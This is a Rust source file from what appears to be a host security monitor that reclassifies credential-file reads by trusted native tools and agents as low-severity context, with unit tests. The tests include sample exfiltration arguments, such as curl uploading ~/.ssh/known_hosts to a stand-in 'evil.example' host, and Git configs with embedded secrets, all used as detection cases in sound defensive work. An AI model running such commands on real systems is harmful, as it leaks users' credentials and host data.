//! Native authentication is context, not a credential-theft sequence by itself.
use crate::{context::Context, explain::Finding, provenance::Provenance};
use std::os::unix::fs::MetadataExt;

fn ordinary_agent_git_config(f: &Finding) -> bool {
    if f.rule != "moat-cred-project-token-read" || f.context != Context::Agent
        || f.proc.in_container != Some(false) || f.proc.user_ns_host != Some(true)
        || f.actor.modified.is_some() || f.ioc.is_some()
        || f.kill_expected || f.denied || f.request_kill
    { return false; }
    let Some(session) = &f.proc.agent_session else { return false };
    let Some(file) = &f.file else { return false };
    let direct_agent = f.proc.pid == session.root_pid && f.proc.exe == session.executable;
    let native_claude_fork = f.proc.pid != session.root_pid
        && session.agent == "claude"
        && f.proc.exe == session.executable
        && f.proc.args.contains("--fork-session")
        && f.proc.args.contains("--resume ");
    let pulumi_child = f.proc.pid != session.root_pid
        && f.proc.exe.ends_with("/pulumi/pulumi")
        && f.proc.exe.contains("/.local/share/mise/installs/pulumi/")
        && f.proc.args.split_whitespace().next().is_some_and(|arg| matches!(arg, "preview" | "import" | "up"));
    if !(direct_agent || native_claude_fork || pulumi_child) || session.workspace.is_empty()
        || file.path != format!("{}/.git/config", session.workspace.trim_end_matches('/'))
    { return false; }
    // A normal agent inspects its own repository metadata. Keep the full
    // credential signal when the config itself contains an authenticated URL
    // or a key whose purpose is to carry a secret.
    let Ok(metadata) = std::fs::metadata(&file.path) else { return false };
    if !metadata.is_file() || metadata.len() > 65_536 { return false; }
    let Ok(contents) = std::fs::read_to_string(&file.path) else { return false };
    !contents.lines().any(|line| {
        let Some((key, value)) = line.trim().split_once('=') else { return false };
        let key = key.trim().to_ascii_lowercase();
        if ["extraheader", "authorization", "password", "token", "secret", "oauth"]
            .iter().any(|part| key.contains(part)) { return true; }
        if key != "url" && key != "pushurl" { return false; }
        let value = value.trim();
        value.split_once("://").is_some_and(|(_, rest)|
            rest.split('/').next().is_some_and(|authority| authority.contains('@')))
    })
}

pub fn classify(f: &mut Finding, homes: &[String]) {
    classify_with(f, homes, super::native_context::system_executable)
}

fn classify_with(f: &mut Finding, homes: &[String], trusted: impl Fn(&str) -> bool) {
    if ordinary_agent_git_config(f) {
        f.meta.family = "context".into();
        f.meta.severity = "low".into();
        f.meta.tier = "signal".into();
        f.what_override = Some("An agent read the Git configuration of its own workspace; no embedded authentication setting was found.".into());
        f.extra_evidence.push("agent, native Claude fork, or Pulumi child read its own workspace .git/config without an authenticated URL or secret-bearing key".into());
        return;
    }
    // Our offline npm scanner reads .npmrc to discover registry hosts. Package
    // shims also invoke it for commands such as `pnpm --version`, where the
    // install context is absent even though the scanner is still the observer.
    // Require the installed, root-controlled script and the user's own config;
    // no other Python reader or registry credential path gets this treatment.
    if f.rule == "moat-cred-registry-token-read"
        && f.proc.exe == "/usr/bin/python3"
        && f.actor.script.as_deref() == Some("/usr/bin/moat-scan-npm")
        && f.actor.package.as_deref().is_some_and(|p| p.starts_with("omarchy-moat "))
        && f.actor.modified.is_none()
        && f.proc.in_container == Some(false)
        && f.proc.user_ns_host == Some(true)
        && f.ioc.is_none() && !f.kill_expected && !f.denied && !f.request_kill
        && trusted("/usr/bin/moat-scan-npm")
        && f.file.as_ref().is_some_and(|file| homes.iter().any(|home| {
            file.path == format!("{home}/.npmrc")
                && std::fs::metadata(home).is_ok_and(|m| m.uid() == f.proc.uid)
        }) || (file.path == format!("{}/.npmrc", f.proc.cwd.trim_end_matches('/'))
            && std::fs::metadata(&f.proc.cwd).is_ok_and(|m| m.uid() == f.proc.uid)))
    {
        f.meta.family = "auth".into();
        f.meta.severity = "low".into();
        f.meta.tier = "signal".into();
        f.meta.title = "Moat scanner read npm registry configuration".into();
        f.what_override = Some("Moat's installed npm scanner read registry settings to classify package sources during an install.".into());
        f.extra_evidence.push("scanner context: root-controlled moat-scan-npm script read the user's own .npmrc".into());
        return;
    }
    // Deno loads the user's npm configuration itself at startup. Without a
    // read or network grant, a `run --no-prompt --no-remote` script cannot read
    // that file or send its contents; keep the runtime read as context.
    if f.rule == "moat-cred-registry-token-read"
        && f.proc.exe == "/usr/bin/deno"
        && f.actor.provenance == Provenance::Official
        && f.actor.modified.is_none()
        && f.proc.in_container == Some(false)
        && f.proc.user_ns_host == Some(true)
        && f.ioc.is_none() && !f.kill_expected && !f.denied && !f.request_kill
        && trusted(&f.proc.exe)
        && f.proc.args.split_whitespace().next() == Some("run")
        && f.proc.args.split_whitespace().any(|arg| arg == "--no-prompt")
        && f.proc.args.split_whitespace().any(|arg| arg == "--no-remote")
        && !f.proc.args.split_whitespace().any(|arg| {
            matches!(arg, "-A" | "--allow-all" | "-R" | "-N")
                || arg.starts_with("--allow-read") || arg.starts_with("--allow-net")
        })
        && f.file.as_ref().is_some_and(|file| homes.iter().any(|home| {
            file.path == format!("{home}/.npmrc")
                && std::fs::metadata(home).is_ok_and(|m| m.uid() == f.proc.uid)
        }))
    {
        f.meta.family = "auth".into();
        f.meta.severity = "low".into();
        f.meta.tier = "signal".into();
        f.meta.title = "Deno loaded npm configuration at startup".into();
        f.what_override = Some("Deno loaded the user's npm configuration while starting a local script without read or network permission.".into());
        f.extra_evidence.push("official Deno runtime, no-prompt and no-remote, no read or network grant, same-user ~/.npmrc".into());
        return;
    }
    // curl >= 8.23 populates CURLOPT_SSH_KNOWNHOSTS from ~/.ssh/known_hosts by
    // default and opens it during initialization even for plain HTTP/HTTPS
    // requests. Keep it as auth context when the path is not named in argv.
    if f.rule == "moat-cred-ssh-recon-read"
        && f.proc.exe == "/usr/bin/curl"
        && f.actor.provenance == Provenance::Official
        && f.actor.modified.is_none()
        && f.proc.in_container == Some(false)
        && f.proc.user_ns_host == Some(true)
        && f.ioc.is_none() && !f.kill_expected && !f.denied && !f.request_kill
        && trusted(&f.proc.exe)
        && !f.proc.args.contains("known_hosts")
        && !f.proc.args.contains("/.ssh/")
        && f.file.as_ref().is_some_and(|file| homes.iter().any(|home| {
            (file.path == format!("{home}/.ssh/known_hosts")
                || file.path == format!("{home}/.ssh/known_hosts2"))
                && std::fs::metadata(home).is_ok_and(|m| m.uid() == f.proc.uid)
        }))
    {
        f.meta.family = "auth".into();
        f.meta.severity = "low".into();
        f.meta.tier = "signal".into();
        f.meta.title = "curl loaded SSH known_hosts at startup".into();
        f.what_override = Some("curl opened the user's ~/.ssh/known_hosts during default initialization without referencing it in arguments.".into());
        f.extra_evidence.push("official curl binary, same-user ~/.ssh/known_hosts, path not referenced in arguments".into());
        return;
    }
    if !matches!(f.rule.as_str(), "moat-cred-cloud-credentials-read" | "moat-cred-registry-token-read")
        || !(f.actor.provenance == Provenance::Official
            || (f.actor.provenance == Provenance::Foreign
                && f.actor.package.as_deref().is_some_and(|p| p.starts_with("google-cloud-cli-component-gke-gcloud-auth-plugin "))
                && trusted(&f.proc.exe)))
        || f.actor.modified.is_some()
        || f.proc.in_container != Some(false)
        || f.proc.user_ns_host != Some(true)
        || f.context == Context::PkgInstall
        || f.ioc.is_some() || f.kill_expected || f.denied || f.request_kill
    {
        return;
    }
    let Some(file) = &f.file else { return };
    let own_config = homes.iter().any(|home| {
        ((f.rule == "moat-cred-cloud-credentials-read" && file.path == format!("{home}/.kube/config"))
                || (f.rule == "moat-cred-registry-token-read"
                    && matches!(f.proc.exe.as_str(), "/usr/lib/docker/cli-plugins/docker-buildx" | "/usr/lib/docker/cli-plugins/docker-compose")
                    && file.path == format!("{home}/.docker/config.json")))
            && std::fs::metadata(home).is_ok_and(|m| m.uid() == f.proc.uid)
    });
    if !own_config { return; }
    let expected = match f.proc.exe.as_str() {
        "/usr/bin/gke-gcloud-auth-plugin" => f.ancestry.first().is_some_and(|p| p.exe == "/usr/bin/kubectl" && p.uid == f.proc.uid),
        "/usr/lib/docker/cli-plugins/docker-buildx" | "/usr/lib/docker/cli-plugins/docker-compose" => {
            f.ancestry.first().is_some_and(|p| p.exe == "/usr/bin/docker" && p.uid == f.proc.uid)

        }
        _ => false,
    };
    if !expected { return; }
    f.meta.family = "auth".into();
    f.meta.severity = "low".into();
    f.meta.tier = "signal".into();
    f.meta.title = "Native tool accessed its authentication configuration".into();
    f.what_override = Some("A package-owned native authentication or build tool read its user's authentication configuration in its expected launch context. Other credential files and destinations remain monitored.".into());
    f.extra_evidence.push("native authentication context: package-owned host executable, same-user authentication configuration and expected launcher; this is not permission for other tools".into());
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn agent_own_git_metadata_is_low_only_without_embedded_auth() {
        let root = tempfile::tempdir().unwrap();
        let git = root.path().join(".git");
        std::fs::create_dir(&git).unwrap();
        let config = git.join("config");
        std::fs::write(&config, "[remote \"origin\"]\n url = git@github.com:example/repo.git\n").unwrap();
        let exe = "/opt/example/claude";
        let mut f = Finding::new("moat-cred-project-token-read", crate::policy::PolicyMeta::fallback("moat-cred-project-token-read"), crate::proctable::ProcInfo {
            pid: 123, exe: exe.into(), in_container: Some(false), user_ns_host: Some(true),
            agent_session: Some(crate::agent::AgentSession {
                id: "session".into(), root_pid: 123, agent: "claude".into(),
                executable: exe.into(), workspace: root.path().display().to_string(),
            }), ..Default::default()
        });
        f.context = Context::Agent;
        f.file = Some(crate::alert::FileRef { path: config.display().to_string(), sha256: None });
        assert!(ordinary_agent_git_config(&f));
        classify_with(&mut f, &[], |_| false);
        assert_eq!(f.meta.severity, "low");
        assert_eq!(f.meta.family, "context");
        for text in [
            "[remote \"origin\"]\n url = https://user:secret@example.com/repo.git\n",
            "[http]\n extraheader = Authorization: Bearer secret\n",
        ] {
            std::fs::write(&config, text).unwrap();
            assert!(!ordinary_agent_git_config(&f));
        }
        std::fs::write(&config, "[core]\n bare = false\n").unwrap();
        f.proc.pid = 124;
        assert!(!ordinary_agent_git_config(&f));
        f.proc.args = "--session-id child --fork-session --resume session.jsonl".into();
        assert!(ordinary_agent_git_config(&f));
        f.proc.args = String::new();
        f.proc.exe = "/home/dan/.local/share/mise/installs/pulumi/3.229.0/pulumi/pulumi".into();
        f.proc.args = "preview --stack example".into();
        assert!(ordinary_agent_git_config(&f));
        f.proc.args = "login".into();
        assert!(!ordinary_agent_git_config(&f));
        f.proc.args = "up --yes".into();
        std::fs::write(&config, "[http]\n extraheader = Authorization: Bearer secret\n").unwrap();
        assert!(!ordinary_agent_git_config(&f));
        std::fs::write(&config, "[core]\n bare = false\n").unwrap();
        f.proc.pid = 123;
        f.file.as_mut().unwrap().path = root.path().join("other/.git/config").display().to_string();
        assert!(!ordinary_agent_git_config(&f));
    }
    #[test]
    fn installed_npm_scanner_read_is_context_only() {
        let home = tempfile::tempdir().unwrap();
        let homes = vec![home.path().display().to_string()];
        let p = crate::proctable::ProcInfo {
            exe: "/usr/bin/python3".into(), uid: unsafe { libc::geteuid() },
            in_container: Some(false), user_ns_host: Some(true), ..Default::default()
        };
        let mut base = Finding::new("moat-cred-registry-token-read", crate::policy::PolicyMeta::fallback("moat-cred-registry-token-read"), p);
        base.context = Context::PkgInstall;
        base.actor.provenance = Provenance::Foreign;
        base.actor.package = Some("omarchy-moat 0.1.0-196".into());
        base.actor.script = Some("/usr/bin/moat-scan-npm".into());
        base.file = Some(crate::alert::FileRef { path: format!("{}/.npmrc", homes[0]), sha256: None });
        classify_with(&mut base, &homes, |_| true);
        assert_eq!(base.meta.family, "auth");
        let mut version_probe = base.clone();
        version_probe.meta.family = "cred".into();
        version_probe.context = Context::Unknown;
        classify_with(&mut version_probe, &homes, |_| true);
        assert_eq!(version_probe.meta.family, "auth");
        let project = tempfile::tempdir().unwrap();
        let mut project_scan = base.clone();
        project_scan.meta.family = "cred".into();
        project_scan.proc.cwd = project.path().display().to_string();
        project_scan.file.as_mut().unwrap().path = format!("{}/.npmrc", project_scan.proc.cwd);
        classify_with(&mut project_scan, &homes, |_| true);
        assert_eq!(project_scan.meta.family, "auth");
        let mut other = base.clone();
        other.meta.family = "cred".into();
        other.actor.script = Some("/tmp/moat-scan-npm".into());
        classify_with(&mut other, &homes, |_| true);
        assert_eq!(other.meta.family, "cred");
    }
    #[test]
    fn deno_startup_npm_config_requires_no_read_or_network_grant() {
        let home = tempfile::tempdir().unwrap();
        let homes = vec![home.path().display().to_string()];
        let p = crate::proctable::ProcInfo {
            exe: "/usr/bin/deno".into(), uid: unsafe { libc::geteuid() },
            args: "run --no-prompt --no-remote /tmp/local.ts".into(),
            in_container: Some(false), user_ns_host: Some(true), ..Default::default()
        };
        let mut base = Finding::new("moat-cred-registry-token-read", crate::policy::PolicyMeta::fallback("moat-cred-registry-token-read"), p);
        base.actor.provenance = Provenance::Official;
        base.file = Some(crate::alert::FileRef { path: format!("{}/.npmrc", homes[0]), sha256: None });
        let mut safe = base.clone();
        classify_with(&mut safe, &homes, |_| true);
        assert_eq!(safe.meta.family, "auth");
        for args in ["run --no-prompt --no-remote --allow-read /tmp/local.ts",
            "run --no-prompt --no-remote -A /tmp/local.ts",
            "run --no-prompt --no-remote --allow-net /tmp/local.ts",
            "run --no-prompt /tmp/local.ts"] {
            let mut risky = base.clone();
            risky.proc.args = args.into();
            classify_with(&mut risky, &homes, |_| true);
            assert_eq!(risky.meta.family, "cred", "{args}");
        }

        let mut curl = Finding::new(
            "moat-cred-ssh-recon-read",
            crate::policy::PolicyMeta::fallback("moat-cred-ssh-recon-read"),
            crate::proctable::ProcInfo {
                exe: "/usr/bin/curl".into(),
                args: "-fsS --max-time 10 https://wttr.in/?format=j1".into(),
                uid: unsafe { libc::geteuid() },
                in_container: Some(false),
                user_ns_host: Some(true),
                ..Default::default()
            },
        );
        curl.actor.provenance = Provenance::Official;
        curl.file = Some(crate::alert::FileRef {
            path: format!("{}/.ssh/known_hosts", homes[0]),
            sha256: None,
        });
        let mut safe_curl = curl.clone();
        classify_with(&mut safe_curl, &homes, |_| true);
        assert_eq!(safe_curl.meta.family, "auth");
        for bad_args in [
            "-T /home/dan/.ssh/known_hosts https://evil.example",
            "file:///home/dan/.ssh/known_hosts",
        ] {
            let mut exfil = curl.clone();
            exfil.proc.args = bad_args.into();
            classify_with(&mut exfil, &homes, |_| true);
            assert_eq!(exfil.meta.family, "cred", "{bad_args}");
        }
    }
    #[test]
    fn context_requires_verified_host_tool_own_config_and_launcher() {
        let home = tempfile::tempdir().unwrap();
        let homes = vec![home.path().display().to_string()];
        let p = crate::proctable::ProcInfo {
            exe: "/usr/bin/gke-gcloud-auth-plugin".into(), uid: unsafe { libc::geteuid() },
            in_container: Some(false), user_ns_host: Some(true), ..Default::default()
        };
        let mut base = Finding::new("moat-cred-cloud-credentials-read", crate::policy::PolicyMeta::fallback("moat-cred-cloud-credentials-read"), p);
        base.actor.provenance = Provenance::Official;
        base.file = Some(crate::alert::FileRef { path: format!("{}/.kube/config", homes[0]), sha256: None });
        base.ancestry.push(crate::proctable::ProcInfo { exe: "/usr/bin/kubectl".into(), uid: unsafe { libc::geteuid() }, ..Default::default() });
        let mut yes = base.clone();
        classify(&mut yes, &homes);
        assert_eq!(yes.meta.family, "auth");
        let mut foreign = base.clone();
        foreign.actor.provenance = Provenance::Foreign;
        foreign.actor.package = Some("google-cloud-cli-component-gke-gcloud-auth-plugin 584.0.0-1".into());
        classify_with(&mut foreign, &homes, |_| true);
        assert_eq!(foreign.meta.family, "auth");
        let mut untrusted = base.clone();
        untrusted.actor.provenance = Provenance::Foreign;
        untrusted.actor.package = foreign.actor.package.clone();
        classify_with(&mut untrusted, &homes, |_| false);
        assert_ne!(untrusted.meta.family, "auth");
        let mut buildx = base.clone();
        buildx.proc.exe = "/usr/lib/docker/cli-plugins/docker-buildx".into();
        buildx.ancestry[0].exe = "/usr/bin/docker".into();
        for args in ["buildx ls", "ls --format json", "buildx imagetools inspect registry.example/project/image:tag", "imagetools inspect registry.example/project/image:tag"] {
            let mut inspect = buildx.clone();
            inspect.proc.args = args.into();
            classify(&mut inspect, &homes);
            assert_eq!(inspect.meta.family, "auth");
        }
        let mut registry = buildx.clone();
        registry.proc.args = "buildx ls".into();
        registry.rule = "moat-cred-registry-token-read".into();
        registry.file.as_mut().unwrap().path = format!("{}/.docker/config.json", homes[0]);
        classify(&mut registry, &homes);
        assert_eq!(registry.meta.family, "auth");
        let mut compose = registry.clone();
        compose.proc.exe = "/usr/lib/docker/cli-plugins/docker-compose".into();
        compose.proc.args = "compose up -d dragonfly".into();
        compose.meta.family = "cred".into();
        classify_with(&mut compose, &homes, |_| true);
        assert_eq!(compose.meta.family, "auth");
        compose.meta.family = "cred".into();
        compose.ancestry[0].exe = "/usr/bin/bash".into();
        classify_with(&mut compose, &homes, |_| true);
        assert_eq!(compose.meta.family, "cred");
        registry.meta.family = "cred".into();
        registry.file.as_mut().unwrap().path = format!("{}/.npmrc", homes[0]);
        classify(&mut registry, &homes);
        assert_eq!(registry.meta.family, "cred");
        // Buildx initializes authentication for read-only housekeeping too.
        // The invariant is its own config + Docker launcher, not a command list.
        for args in ["buildx prune -af", "buildx du", "buildx imagetools create registry.example/project/image:tag"] {
            let mut native = buildx.clone();
            native.proc.args = args.into();
            classify(&mut native, &homes);
            assert_eq!(native.meta.family, "auth");
        }
        buildx.ancestry[0].exe = "/usr/bin/bash".into();
        classify(&mut buildx, &homes);
        assert_ne!(buildx.meta.family, "auth");
        for case in 0..6 {
            let mut no = base.clone();
            match case {
                0 => no.proc.in_container = Some(true),
                1 => no.actor.provenance = Provenance::User,
                2 => no.file.as_mut().unwrap().path = format!("{}/.aws/credentials", homes[0]),
                3 => no.ancestry.clear(),
                4 => no.context = Context::PkgInstall,
                _ => no.proc.exe = "/tmp/gke-gcloud-auth-plugin".into(),
            }
            classify(&mut no, &homes);
            assert_ne!(no.meta.family, "auth", "case {case}");
        }
    }
}
